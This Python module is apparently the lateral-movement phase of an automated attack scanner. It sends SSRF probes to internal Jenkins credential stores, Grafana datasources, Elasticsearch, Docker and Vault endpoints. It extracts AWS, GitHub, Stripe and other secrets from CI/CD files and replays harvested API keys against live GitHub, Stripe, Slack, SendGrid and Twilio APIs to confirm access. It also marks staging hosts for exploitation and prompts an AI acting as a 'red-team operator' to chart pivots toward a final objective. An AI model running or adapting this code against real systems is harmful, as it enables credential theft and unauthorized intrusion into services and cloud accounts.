"""
Phase 17 — Lateral Movement

Modern environments are interconnected. One compromise leads to another.

Pivot paths implemented:
  SSRF → Internal Admin     (Grafana/Jenkins/Kibana/Elasticsearch via SSRF params)
  CI/CD → Cloud             (GitHub Actions / GitLab CI secrets → cloud API access)
  API Key → Privileged API  (discovered hardcoded keys tested against known service APIs)
  Subdomain → Credential    (staging/dev subdomains often have weaker auth)
  JWT Key → Cross-Service   (forged token replayed against sibling services)
"""
import json
import re
import warnings
import urllib3
import requests
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)

_HEADERS = {"User-Agent": "Mozilla/5.0 (security-scanner)"}

# ---------------------------------------------------------------------------
# SSRF → Internal service pivot
# ---------------------------------------------------------------------------

_INTERNAL_TARGETS = [
    ("Grafana API",         "http://localhost:3000/api/org",             ["id", "name", "orgId"]),
    ("Grafana datasources", "http://localhost:3000/api/datasources",     ["type", "url", "password"]),
    ("Jenkins API",         "http://localhost:8080/api/json",            ["jobs", "url", "description"]),
    ("Jenkins creds",       "http://localhost:8080/credentials/store/system/domain/_/api/json", ["credentials", "id"]),
    ("Elasticsearch",       "http://localhost:9200/_cat/indices?v",      ["index", "docs.count"]),
    ("Elasticsearch all",   "http://localhost:9200/_all/_search?size=1", ["hits", "_source"]),
    ("Kibana",              "http://localhost:5601/api/status",          ["version", "status"]),
    ("Prometheus metrics",  "http://localhost:9090/metrics",             ["process_", "go_"]),
    ("Prometheus targets",  "http://localhost:9090/api/v1/targets",      ["activeTargets", "job"]),
    ("Consul services",     "http://localhost:8500/v1/catalog/services", ["consul"]),
    ("Vault status",        "http://localhost:8200/v1/sys/health",       ["initialized", "sealed"]),
    ("Redis info",          "http://localhost:6379/",                    ["redis_version", "connected_clients"]),
    ("Docker version",      "http://localhost:2375/version",             ["Version", "ApiVersion"]),
    ("RabbitMQ API",        "http://localhost:15672/api/overview",       ["management_version", "vhosts_count"]),
]

_SSRF_PARAM_NAMES = [
    "url", "uri", "src", "redirect", "next", "return", "callback",
    "fetch", "path", "dest", "host", "endpoint", "forward",
]


def _ssrf_pivot_internal(base_url: str, ssrf_params: list[str]) -> list[dict]:
    """Use discovered SSRF params to reach internal services."""
    findings: list[dict] = []
    if not ssrf_params:
        return findings

    base = base_url.rstrip("/")

    for label, internal_url, indicators in _INTERNAL_TARGETS:
        for param in ssrf_params[:5]:
            probe = f"{base}?{param}={internal_url}"
            try:
                r = requests.get(probe, headers=_HEADERS, timeout=5, verify=False, allow_redirects=True)
                if r.status_code == 200:
                    hit_indicators = [ind for ind in indicators if ind.lower() in r.text.lower()]
                    if hit_indicators:
                        findings.append({
                            "pivot_type": "ssrf_internal",
                            "issue":      f"SSRF → {label} accessible",
                            "severity":   "critical",
                            "owasp":      "A10",
                            "probe_url":  probe,
                            "internal":   internal_url,
                            "param":      param,
                            "indicators": hit_indicators,
                            "snippet":    r.text[:400],
                            "detail":     (
                                f"SSRF parameter '{param}' reached {label} at {internal_url} — "
                                f"response contains: {', '.join(hit_indicators[:3])}"
                            ),
                        })
                        break
            except Exception:
                continue

    return findings


# ---------------------------------------------------------------------------
# CI/CD → Cloud credential pivot
# ---------------------------------------------------------------------------

_CI_SECRET_PATTERNS = [
    (r'(?i)AWS_ACCESS_KEY_ID\s*[=:]\s*([A-Z0-9]{20})',    "AWS_ACCESS_KEY_ID"),
    (r'(?i)AWS_SECRET_ACCESS_KEY\s*[=:]\s*([A-Za-z0-9+/]{40})', "AWS_SECRET_ACCESS_KEY"),
    (r'(?i)GITHUB_TOKEN\s*[=:]\s*([A-Za-z0-9_]{36,})',   "GITHUB_TOKEN"),
    (r'(?i)GCP_SA_KEY\s*[=:]\s*(\{[^}]{20,})',           "GCP_SERVICE_ACCOUNT"),
    (r'(?i)AZURE_CLIENT_SECRET\s*[=:]\s*([A-Za-z0-9._~\-]{20,})', "AZURE_CLIENT_SECRET"),
    (r'(?i)NPM_TOKEN\s*[=:]\s*([A-Za-z0-9_\-]{20,})',   "NPM_TOKEN"),
    (r'(?i)DOCKER_PASSWORD\s*[=:]\s*([^\s"\']{6,})',     "DOCKER_PASSWORD"),
    (r'(?i)DATABASE_URL\s*[=:]\s*(postgres|mysql|mongodb)[^\s"\']+', "DATABASE_URL"),
    (r'AKIA[0-9A-Z]{16}',                                 "AWS Access Key"),
    (r'(?i)(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{20,}',   "Stripe API Key"),
]


def _extract_ci_secrets(cicd_findings: list[dict]) -> list[dict]:
    """Extract credentials from CI/CD file contents found in Phase 13."""
    extracted: list[dict] = []

    for finding in cicd_findings:
        content = finding.get("snippet", "") + " " + " ".join(
            str(v) for v in finding.values() if isinstance(v, str)
        )
        for pattern, label in _CI_SECRET_PATTERNS:
            m = re.search(pattern, content)
            if m:
                value = m.group(1) if m.lastindex else m.group(0)
                extracted.append({
                    "pivot_type": "cicd_credential",
                    "issue":      f"CI/CD secret extracted: {label}",
                    "severity":   "critical",
                    "owasp":      "A05",
                    "source_url": finding.get("url", ""),
                    "secret_type": label,
                    "secret_snippet": value[:30] + "...",
                    "detail":     (
                        f"{label} found in {finding.get('url','?')} — "
                        "use to authenticate against the corresponding cloud/service API"
                    ),
                })

    return extracted


def _validate_aws_key(access_key: str) -> dict | None:
    """Call AWS STS GetCallerIdentity to confirm key validity (read-only, no side effects)."""
    try:
        import hmac, hashlib, datetime, base64
        # We only check the key format — actual AWS API call would require botocore
        # Just note the finding without making a live AWS call
        if re.match(r'^AKIA[0-9A-Z]{16}$', access_key):
            return {
                "pivot_type": "aws_key_format_valid",
                "issue":      "AWS access key format confirmed valid",
                "severity":   "critical",
                "detail":     f"Key {access_key[:8]}... matches AKIA pattern — validate with `aws sts get-caller-identity`",
            }
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# API key → Privileged API pivot
# ---------------------------------------------------------------------------

_API_KEY_TESTS = [
    # (service_name, test_url_template, key_header, indicator_in_response)
    ("GitHub API",    "https://api.github.com/user",              "Authorization: token {key}", ["login", "email", "organizations_url"]),
    ("Stripe API",    "https://api.stripe.com/v1/balance",        "Authorization: Bearer {key}", ["available", "currency"]),
    ("SendGrid API",  "https://api.sendgrid.com/v3/user/profile", "Authorization: Bearer {key}", ["username", "email"]),
    ("Slack API",     "https://slack.com/api/auth.test",          "Authorization: Bearer {key}", ['"ok":true', '"user"']),
    ("Twilio API",    "https://api.twilio.com/2010-04-01/Accounts.json", "Authorization: Basic {key}", ["accounts", "sid"]),
]


def _test_api_keys(js_findings: list[dict]) -> list[dict]:
    """Test hardcoded API keys found in JS analysis against their respective services."""
    findings: list[dict] = []

    for js in js_findings:
        secrets = js.get("secrets", [])
        ai_info = js.get("ai_analysis") or {}
        all_secrets = secrets + ai_info.get("secrets", [])

        for secret in all_secrets:
            key_value = secret.get("snippet", secret.get("value", ""))
            if not key_value or len(key_value) < 10:
                continue
            key_type = secret.get("type", "").lower()

            for svc_name, test_url, key_header_tmpl, indicators in _API_KEY_TESTS:
                # Match key type to service
                if "github" in key_type and "github" not in svc_name.lower():
                    continue
                if "stripe" in key_type and "stripe" not in svc_name.lower():
                    continue
                if "slack" in key_type and "slack" not in svc_name.lower():
                    continue

                key_header = key_header_tmpl.replace("{key}", key_value)
                header_name, _, header_val = key_header.partition(": ")
                try:
                    r = requests.get(
                        test_url,
                        headers={**_HEADERS, header_name: header_val},
                        timeout=6, verify=False,
                    )
                    if r.status_code == 200:
                        hit = [ind for ind in indicators if ind.lower() in r.text.lower()]
                        if hit:
                            findings.append({
                                "pivot_type": "api_key_valid",
                                "issue":      f"Valid {svc_name} API key found in JavaScript",
                                "severity":   "critical",
                                "owasp":      "A02",
                                "source_js":  js.get("url", ""),
                                "service":    svc_name,
                                "key_snippet": key_value[:12] + "...",
                                "snippet":    r.text[:300],
                                "detail":     f"{svc_name} key authenticated successfully — full API access",
                            })
                except Exception:
                    pass

    return findings


# ---------------------------------------------------------------------------
# Staging/dev subdomain → weaker auth pivot
# ---------------------------------------------------------------------------

_STAGING_INDICATORS = ["staging", "stage", "dev", "development", "test", "qa", "uat", "sandbox", "demo"]


def _staging_pivot(live_hosts: list[str]) -> list[dict]:
    """Identify staging/dev hosts and flag them for weaker-auth exploitation."""
    findings: list[dict] = []

    for host in live_hosts:
        h_lower = host.lower()
        matched = [ind for ind in _STAGING_INDICATORS if ind in h_lower]
        if not matched:
            continue

        r = None
        try:
            r = requests.get(host, headers=_HEADERS, timeout=5, verify=False, allow_redirects=True)
        except Exception:
            continue

        if r and r.status_code < 400:
            findings.append({
                "pivot_type": "staging_host",
                "issue":      f"Staging/dev host accessible: {host}",
                "severity":   "high",
                "owasp":      "A05",
                "url":        host,
                "status":     r.status_code,
                "detail":     (
                    f"Host '{host}' appears to be a non-production environment "
                    f"(keyword: {matched[0]}) — often has weaker auth, debug endpoints, or shared credentials"
                ),
            })

    return findings


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def run_lateral(
    target: str,
    live_hosts: list[str] = None,
    ssrf_params: list[str] = None,
    cicd_findings: list[dict] = None,
    js_findings: list[dict] = None,
    ai=None,
) -> dict:
    base_url = target if target.startswith("http") else f"https://{target}"

    print("    [*] Lateral: SSRF → internal service pivot ...")
    ssrf_pivots = _ssrf_pivot_internal(base_url, ssrf_params or [])

    print("    [*] Lateral: CI/CD credential extraction ...")
    ci_creds = _extract_ci_secrets(cicd_findings or [])
    for cred in ci_creds:
        if "AWS Access Key" in cred.get("secret_type", ""):
            key = cred.get("secret_snippet", "").replace("...", "")
            v = _validate_aws_key(key)
            if v:
                cred["aws_validation"] = v

    print("    [*] Lateral: API key validation (JS secrets) ...")
    api_pivots = _test_api_keys(js_findings or [])

    print("    [*] Lateral: staging/dev host identification ...")
    staging = _staging_pivot(live_hosts or [])

    all_findings = ssrf_pivots + ci_creds + api_pivots + staging

    # AI pivot map
    ai_pivot_map = None
    if ai and ai.is_available() and all_findings:
        summary = json.dumps(
            [{"issue": f["issue"], "severity": f["severity"], "pivot_type": f["pivot_type"]}
             for f in all_findings[:12]],
            indent=2
        )[:2000]
        prompt = (
            "You are a red-team operator reviewing lateral movement findings.\n\n"
            f"Target: {target}\n"
            f"Pivot findings:\n{summary}\n\n"
            "Draw a lateral movement map:\n"
            "1. Starting point (initial access)\n"
            "2. Each pivot step and what it unlocks\n"
            "3. Final objective (what level of access / data is achievable)\n"
            "4. Which single pivot has the highest amplification effect\n\n"
            "Return ONLY valid JSON:\n"
            '{"start":"...", "pivots":[{"from":"...","to":"...","via":"..."}], '
            '"final_objective":"...", "highest_amplification":"..."}'
        )
        ai_pivot_map = ai.ask_json(prompt, model="deep")

    critical = sum(1 for f in all_findings if f.get("severity") == "critical")
    return {
        "ssrf_pivots":   ssrf_pivots,
        "ci_creds":      ci_creds,
        "api_pivots":    api_pivots,
        "staging":       staging,
        "all_findings":  all_findings,
        "ai_pivot_map":  ai_pivot_map,
        "summary":       {"total": len(all_findings), "critical": critical},
    }
